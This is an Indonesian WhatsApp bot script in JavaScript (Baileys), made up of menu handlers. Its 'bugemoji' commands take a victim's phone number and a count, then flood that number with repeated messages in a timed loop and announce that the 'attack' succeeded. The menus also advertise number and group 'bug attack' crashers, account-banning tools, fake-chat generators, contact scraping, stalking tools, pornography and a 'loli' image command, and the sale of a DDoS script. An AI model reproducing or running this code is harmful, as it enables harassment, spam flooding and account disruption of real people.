case "gamemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *GAMES MENU* )▭▬▭

┣❏ᴛᴛᴄ
┣❏ᴅᴇʟᴛᴄ
┣❏ꜱᴜɪᴛᴘᴠᴘ
┣❏ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
┣❏ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
┣❏ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
┣❏ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
┣❏ᴛᴇʙᴀᴋ ʟᴀɢᴜ
┣❏ᴛᴇʙᴀᴋ ʟᴏɴᴛᴏɴɢ
┣❏ꜰᴀᴍɪʟʏ100
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break       
case "serverpanel1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SERVER PANEL 1* )▭▬▭

⭔${prefix}panel
⭔${prefix}linklog1
⭔${prefix}listusr1
⭔${prefix}delusr1
⭔${prefix}listsrv1
⭔${prefix}delsrv1
⭔${prefix}premlist1
⭔${prefix}ramlist1
⭔${prefix}addusr1
⭔${prefix}addsrv1
⭔${prefix}reinstall1
⭔${prefix}tutorial1
⭔${prefix}updatesrv1
⭔${prefix}suspend1 *id*
⭔${prefix}unsuspend1 *id*
⭔${prefix}crateadmin1
⭔${prefix}listadmin1

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "linklog1": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN 1*
${domain}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "mathmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*
▭▬▭( *MATH MENU* )▭▬▭

々 ${prefix}math Noob
々 ${prefix}math Easy
々 ${prefix}math Medium
々 ${prefix}math Hard
々 ${prefix}math Extreme
々 ${prefix}math Impossible
々 ${prefix}math Impossible2

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "bugemoji": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUG EMOJI* )▭▬▭

⭔ ${prefix}🌷 62xx|Jumblah
⭔ ${prefix}🐲 62xx|jumblah
⭔ ${prefix}🐉 62xx|Jumblah
⭔ ${prefix}🌵 62xx|Jumblah
⭔ ${prefix}🎄 62xx|Jumblah
⭔ ${prefix}🌲 62xx|Jumblah 
⭔ ${prefix}🌳 62xx|Jumblah
⭔ ${prefix}🌱 62xx|Jumblah
⭔ ${prefix}😈 62xx|Jumblah
⭔ ${prefix}🗿 62xx|Jumblah
⭔ ${prefix}😎 62xx|Jumblah

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
        case 'unlitet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '😎': case '😈': case '🗿':  {
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000) 
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 30 MENIT !!*
*GAK JEDA DELETE AKSES NO REFF !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Sanz Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Litzz445", 
"sourceUrl": "https://youtube.com/@Litzz445" }}}, { quoted: m })
}
break
case "allmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

_I Am *Botzz* Made By Reyz Hayanasi_
_If There Is An Error!!_
_Please Report To Developer_
_Berikut Saldo anda_ Rp: ${toRupiah(cekSaldo(sender, db_saldo))}
▬▭▬▭▬▭▬▭▬▭▬▭▬
乂 *I N F O-U S E R*

   ☍ *Name* : ${pushname}
   ☍ *Number* : ${m.sender.split('@')[0]}
   ☍ *Status* : ${isOwner ? "Owner 👑️":"User"}
   ☍ *User* : ${isPremium ? 'Premium 👑' : 'Gratisan'}
   
乂 *I N F O-B O T*

  ☍ Name : ${global.namabot}
  ☍ Creator : ${global.namaCreator}
  ☍ Prefix : ( ${prefix} )
  ☍ Nama Script : ${global.namasc}
  ☍ Versi Script : ${global.versisc}
  ☍ Mode : ${Biiofc.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ Platform : ${os.platform()}
  ☍ Runtime : ${runtime(process.uptime())}
  ☍ Language : Javascript
  ☍ Version Baileys : *^${version}*
  ☍ Total Fitur : ${totalFitur()}

▭▬▭( *OWNER MENU* )▭▬▭

⭔${prefix}addowner*nomor*
⭔${prefix}delowner *nomor*
⭔${prefix}addprem *nomor*
⭔${prefix}delprem *nomor*
⭔${prefix}self
⭔${prefix}public
⭔${prefix}shutdown
⭔${prefix}getcase
⭔${prefix}enc

▭▬▭( *BUG EMOJI* )▭▬▭

⭔ ${prefix}🌷 62xx|Jumblah
⭔ ${prefix}🐲 62xx|jumblah
⭔ ${prefix}🐉 62xx|Jumblah
⭔ ${prefix}🌵 62xx|Jumblah
⭔ ${prefix}🎄 62xx|Jumblah
⭔ ${prefix}🌲 62xx|Jumblah 
⭔ ${prefix}🌳 62xx|Jumblah
⭔ ${prefix}🌱 62xx|Jumblah
⭔ ${prefix}😈 62xx|Jumblah
⭔ ${prefix}🗿 62xx|Jumblah
⭔ ${prefix}😎 62xx|Jumblah

▭▬▭( *ANIME MENU* )▭▬▭

⭔ ${prefix}animespank
⭔ ${prefix}walpaperanime
⭔ ${prefix}thailand
⭔ ${prefix}loli
⭔ ${prefix}cosplay
⭔ ${prefix}cecan
⭔ ${prefix}cogan
⭔ ${prefix}china
⭔ ${prefix}indonesia
⭔ ${prefix}korea
⭔ ${prefix}malaysia
⭔ ${prefix}vietnam

▭▬▭( *BUG MENU* )▭▬▭

⭔ ${prefix}bugnumber
⭔ ${prefix}buggroup
⭔ ${prefix}bannedmenu
⭔ ${prefix}unbanmenu
⭔ ${prefix}bugemoji
⭔ ${prefix}reportbug

▭▬▭( *BOKEP MENU* )▭▬▭

⭔ ${prefix}xnxxsearch
⭔ ${prefix}xnxxdl
⭔ ${prefix}paptt

▭▬▭( *STALK MENU* )▭▬▭

⊙ ${prefix}githubstalk 
⊙ ${prefix}gitclone
⊙ ${prefix}stalkig
⊙ ${prefix}npmstalk
⊙ ${prefix}stalktiktok

▭▬▭( *MENU GROUP* )▭▬▭

⭔ ${prefix}owner
⭔ ${prefix}qc *teks*
⭔ ${prefix}tts *teks*
⭔ ${prefix}sticker *reply image*
⭔ ${prefix}linkgroup
⭔ ${prefix}hidetag *teks*
⭔ ${prefix}setppbot *teks*
⭔ ${prefix}setppgroup *teks*
⭔ ${prefix}delppgc
⭔ ${prefix}add *nomor*
⭔ ${prefix}kick *nomor*
⭔ ${prefix}promote *nomor*
⭔ ${prefix}demote *nomor*
⭔ ${prefix}promoteall *nomor*
⭔ ${prefix}demoteall *nomor*
⭔ ${prefix}antilink *on/off*
⭔ ${prefix}mutegc *on/off*

▭▬▭( *MENU PUSHKONTAK* )▭▬▭

⭔ ${prefix}cekidgc
⭔ ${prefix}listgroup
⭔ ${prefix}pushkontakv1 *idgc|teks*
⭔ ${prefix}pushkontakv2 *teks*
⭔ ${prefix}pushkontakv3 *idgroup|jeda|teks*
⭔ ${prefix}pushkontakv4 *jeda|teks*
⭔ ${prefix}savecontactv1 *idgroup*
⭔ ${prefix}savecontactv2 *teks*
⭔ ${prefix}savekontak *teks*
⭔ ${prefix}getcontact *teks*
⭔ ${prefix}sendkontak *teks*
⭔ ${prefix}bcvideo *teks*
⭔ ${prefix}bcgc *teks*
⭔ ${prefix}jpm *teks*

▭▬▭( *BUG ATTACK NOMBER* )▭▬▭

⭔ ${prefix}gas *nomor|jumlah*
⭔ ${prefix}kill *nomor|jumlah*
⭔ ${prefix}crash *nomor|jumlah*
⭔ ${prefix}shoot *nomor|jumlah*
⭔ ${prefix}bugkuy *nomor|jumlah*
⭔ ${prefix}duarr *nomor|jumlah*
⭔ ${prefix}killyou *nomor|jumlah*
⭔ ${prefix}doblekill *nomor|jumlah*
⭔ ${prefix}triplekill *nomor|jumlah*
⭔ ${prefix}savage *nomor|jumlah*
⭔ ${prefix}santet *nomor|jumlah*
⭔ ${prefix}danger *nomor|jumlah*
⭔ ${prefix}meninggal *nomor|jumlah*
⭔ ${prefix}headshot *nomor|jumlah*
⭔ ${prefix}mati *nomor|jumlah*

▭▬▭( *BUG ATTACK GRUP v1* )▭▬▭

⭔ ${prefix}killgc *linkgc|jumlah*
⭔ ${prefix}santetgc *linkgc|jumlah*
⭔ ${prefix}gcwakwaw *linkgc|jumlah*
⭔ ${prefix}togc *linkgc|jumlah*
⭔ ${prefix}matigc *linkgc|jumlah*
⭔ ${prefix}kuygc *linkgc|jumlah*
⭔ ${prefix}attackgc *linkgc|jumlah*
⭔ ${prefix}mampusgc *linkgc|jumlah*
⭔ ${prefix}gasgc *linkgc|jumlah*
⭔ ${prefix}ampasgc *linkgc|jumlah*
⭔ ${prefix}bahayagc *linkgc|jumlah*
⭔ ${prefix}hatihatigc *linkgc|jumlah*
⭔ ${prefix}crashgc *linkgc|jumlah*
⭔ ${prefix}stuckgc *linkgc|jumlah*
⭔ ${prefix}ganasgc *linkgc|jumlah*

▭▬▭( *BUG ATTACK GRUP v2* )▭▬▭

⭔ ${prefix}buggc *idgroup|jumlah*
⭔ ${prefix}shootgc *idgroup|jumlah*
⭔ ${prefix}dorrgc *idgroup|jumlah*
⭔ ${prefix}attackgc1 *idgroup|jumlah*
⭔ ${prefix}meninggalgc *idgroup|jumlah*
⭔ ${prefix}matigc1*idgroup|jumlah*
⭔ ${prefix}seranggc *idgroup|jumlah*
⭔ ${prefix}bomgc *idgroup|jumlah*
⭔ ${prefix}ledakangc *idgroup|jumlah*
⭔ ${prefix}atomgc *idgroup|jumlah*
⭔ ${prefix}hancurgc *idgroup|jumlah*
⭔ ${prefix}bugzirgc *idgroup|jumlah*
⭔ ${prefix}stuckgc2 *idgroup|jumlah*
⭔ ${prefix}baugc *idgroup|jumlah*
⭔ ${prefix}ultigc *idgroup|jumlah*

▭▬▭( *MENU BANNED* )▭▬▭

⭔ ${prefix}call *nomor*
⭔ ${prefix}out *nomor*
⭔ ${prefix}verif *nomor*
⭔ ${prefix}kenon *nomor*
⭔ ${prefix}bannedv1 *nomor*
⭔ ${prefix}bannedv2 *nomor*
⭔ ${prefix}bannedv3 *nomor*
⭔ ${prefix}bannedv4 *nomor*
⭔ ${prefix}bannedv5 *nomor*
⭔ ${prefix}bannedv6 *nomor*

▭▬▭( *MENU UNBANNED* )▭▬▭

⭔ ${prefix}unbannedv1 *nomor*
⭔ ${prefix}unbannedv2 *nomor*
⭔ ${prefix}unbannedv3 *nomor*
⭔ ${prefix}unbannedv4 *nomor*
⭔ ${prefix}unbannedv5 *nomor*

▬▭( *JEBEH MENU* )▭▬

⭔${prefix}formatpost
⭔${prefix}formatneed
⭔${prefix}feerekber
⭔${prefix}formatpencairan
⭔${prefix}mc *_nama gc_*
⭔${prefix}allrec
⭔${prefix}danamasuk
⭔${prefix}donerekber
⭔${prefix}donemc *_isi manual_*


▭▬▭( *SALDO MENU* )▭▬▭

⭔ ${prefix}saldonya 
⭔ ${prefix}tfsaldo 
⭔ ${prefix}addsaldo 
⭔ ${prefix}minsaldo 

▭▬▭( *COMMAND BUYSC* )▭▬▭

 ⭔${prefix}buyscbugv1
 ⭔${prefix}buyscbugv2
 ⭔${prefix}buyscbugv3
 ⭔${prefix}buyscv2
 ⭔${prefix}buyscv3
 ⭔${prefix}buyscv3subdo
 ⭔${prefix}buyscv4
 ⭔${prefix}buyscv5
 ⭔${prefix}buyscv6
 ⭔${prefix}buyscv6subdo
 ⭔${prefix}buyscv7otp
 ⭔${prefix}buyscv7addpm2
 ⭔${prefix}buyscjagagrupv1
 ⭔${prefix}buyscjagagrupv2
 ⭔${prefix}buyscpushkontak
 ⭔${prefix}buyschwv191
 ⭔${prefix}buyschwv192
 ⭔${prefix}buyschwv201
 ⭔${prefix}buyschwv202
 ⭔${prefix}buyscpanel
 ⭔${prefix}buyscpushautosave
 ⭔${prefix}buyscjpmv1
 ⭔${prefix}buyscjpmv2
 ⭔${prefix}buyscjpmv3
 ⭔${prefix}buyscvps1
 ⭔${prefix}buyscvps2
 ⭔${prefix}buyscpm2
 ⭔${prefix}buyscthemav1
 ⭔${prefix}buyscthemav2
 ⭔${prefix}buyscnowa
 ⭔${prefix}buyscwebp
 ⭔${prefix}buysctesmoni
 ⭔${prefix}buyscddos
 ⭔${prefix}buymodule
 ⭔${prefix}buyscbukaenc

▬▭( *PAYMENT MENU* )▭▬

⭔ ${prefix}dana
⭔ ${prefix}gopay ( Sedang Proses )
⭔ ${prefix}orkut
⭔ ${prefix}qris
⭔ ${prefix}bri

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}vps
⭔ ${prefix}done
⭔ ${prefix}done?
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}reqpanel

▭▬▭( *SUNTIK MENU* )▭▬▭

⭔ ${prefix}ceksaldo-smm
⭔ ${prefix}smmlist
⭔ ${prefix}suntiksmm 
⭔ ${prefix}cektransaksi 

▭▬▭( *RANDOM MENU* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

▭▬▭( *TIKTOK RANDOM* )▭▬▭

⭔ ${prefix}tiktokgirl
⭔ ${prefix}tiktokghea
⭔ ${prefix}tiktokbocil
⭔ ${prefix}tiktoknukhty
⭔ ${prefix}tiktoksantuy
⭔ ${prefix}tiktokkayes
⭔ ${prefix}tiktokpanrika
⭔ ${prefix}tiktoknotnot
⭔ ${prefix}chinese
⭔ ${prefix}hijab
⭔ ${prefix}indo
⭔ ${prefix}japanese
⭔ ${prefix}korean
⭔ ${prefix}malay
⭔ ${prefix}randomgirl
⭔ ${prefix}randomboy
⭔ ${prefix}thai
⭔ ${prefix}vietnamese
⭔ ${prefix}aesthetic
⭔ ${prefix}antiwork
⭔ ${prefix}blackpink
⭔ ${prefix}bike
⭔ ${prefix}boneka
⭔ ${prefix}cosplay
⭔ ${prefix}cat
⭔ ${prefix}doggo
⭔ ${prefix}justina
⭔ ${prefix}kayes
⭔ ${prefix}kpop
⭔ ${prefix}notnot

▭▬▭( *DOMAIN MENU* )▭▬▭

⭔ ${prefix}subdomain 
⭔ ${prefix}addgc
⭔ ${prefix}delgc

▬▭( *VPS DO* )▭▬

⭔ ${prefix}deldroplet
⭔ ${prefix}svps / sendvps
⭔ ${prefix}sdomain / sendomain
⭔ ${prefix}listdroplet
⭔ ${prefix}cekdroplet
⭔ ${prefix}turnoff
⭔ ${prefix}turnon
⭔ ${prefix}sisadroplet
⭔ ${prefix}rebuild
⭔ ${prefix}restartvps
⭔ ${prefix}vps1g1c
⭔ ${prefix}vps2g1c
⭔ ${prefix}vps4g2c
⭔ ${prefix}vps8g4c
⭔ ${prefix}listvps1 (list harga vps linode)
⭔ ${prefix}listvps2 (list harga vps Digital Ocean)

▭▬▭( *VPA LINODE* )▭▬▭

⭔ ${prefix}resetpassword
⭔ ${prefix}deletelinode
⭔ ${prefix}listlinode
⭔ ${prefix}onlinode
⭔ ${prefix}offlinode
⭔ ${prefix}rebootlinode
⭔ ${prefix}rebuildlinode
⭔ ${prefix}sisalinode
⭔ ${prefix}saldolinode
⭔ ${prefix}cekvps
⭔ ${prefix}linode1gb
⭔ ${prefix}linode2gb
⭔ ${prefix}linode4gb
⭔ ${prefix}linode8gb
⭔ ${prefix}linode16gb

▭▬▭( *TOPUP / SUNTIK SOSMED* )▭▬▭

⭔ ${prefix}ceksaldomaupedia
⭔ ${prefix}list-pascabayar
⭔ ${prefix}list-prabayar
⭔ ${prefix}list-sosmed
⭔ ${prefix}maudeposit
⭔ ${prefix}topupgame
⭔ ${prefix}cekgame
⭔ ${prefix}topup

▭▬▭( *TEXT WA MENU* )▭▬▭

 ༺ 𝗙𝗔𝗞𝗘 𝗖𝗛𝗔𝗧 ༻
 
┣┣⃟❍𒁂⃝➢${prefix}fakec1
┣┣⃟❍𒁂⃝➢${prefix}fakec2
┣┣⃟❍𒁂⃝➢${prefix}fakec3
┣┣⃟❍𒁂⃝➢${prefix}fakec4
┣┣⃟❍𒁂⃝➢${prefix}fakec5
┣┣⃟❍𒁂⃝➢${prefix}fakec6
┣┣⃟❍𒁂⃝➢${prefix}fakec7
┣┣⃟❍𒁂⃝➢${prefix}fakec8
┣┣⃟❍𒁂⃝➢${prefix}fakec9
┣┣⃟❍𒁂⃝➢${prefix}fakec10
┣┣⃟❍𒁂⃝➢${prefix}fakec11
┣┣⃟❍𒁂⃝➢${prefix}alltotal

 ༺ 𝗨𝗡𝗕𝗔𝗡 𝗦𝗣𝗔𝗠  ༻
 
┣┣⃟❍𒁂⃝➢${prefix}textunbanv1
┣┣⃟❍𒁂⃝➢${prefix}textunbanv2
┣┣⃟❍𒁂⃝➢${prefix}textunbanv3
┣┣⃟❍𒁂⃝➢${prefix}textunbanv4
┣┣⃟❍𒁂⃝➢${prefix}textunbanv5
┣┣⃟❍𒁂⃝➢${prefix}textunbanv6
┣┣⃟❍𒁂⃝➢${prefix}textunbanv7
┣┣⃟❍𒁂⃝➢${prefix}textunbanv8
┣┣⃟❍𒁂⃝➢${prefix}textunbanv9
┣┣⃟❍𒁂⃝➢${prefix}textunbanv10
┣┣⃟❍𒁂⃝➢${prefix}textunbanv11
┣┣⃟❍𒁂⃝➢${prefix}textunbanv12
┣┣⃟❍𒁂⃝➢${prefix}textunbanv13
┣┣⃟❍𒁂⃝➢${prefix}textunbanv14
┣┣⃟❍𒁂⃝➢${prefix}textunbanv15
┣┣⃟❍𒁂⃝➢${prefix}textunbanv16
┣┣⃟❍𒁂⃝➢${prefix}textunbanv17
┣┣⃟❍𒁂⃝➢${prefix}textunbanv18
┣┣⃟❍𒁂⃝➢${prefix}textunbanv19
┣┣⃟❍𒁂⃝➢${prefix}textunbanv20
┣┣⃟❍𒁂⃝➢${prefix}textunbanv21

 ༺ 𝗕𝗔𝗡𝗡𝗘𝗗 ༻
 
┣┣⃟❍𒁂⃝➢${prefix}textbanv1
┣┣⃟❍𒁂⃝➢${prefix}textbanv2
┣┣⃟❍𒁂⃝➢${prefix}textbanv3
┣┣⃟❍𒁂⃝➢${prefix}textbanv4
┣┣⃟❍𒁂⃝➢${prefix}textbanv5
┣┣⃟❍𒁂⃝➢${prefix}textbanv6
┣┣⃟❍𒁂⃝➢${prefix}textbanv7
┣┣⃟❍𒁂⃝➢${prefix}textbanv8
┣┣⃟❍𒁂⃝➢${prefix}textbanv9
┣┣⃟❍𒁂⃝➢${prefix}textbanv10

༺ 𝗧𝗢𝗢𝗟𝗦 ༻

 ┣┣⃟❍𒁂⃝➢${prefix}tools1
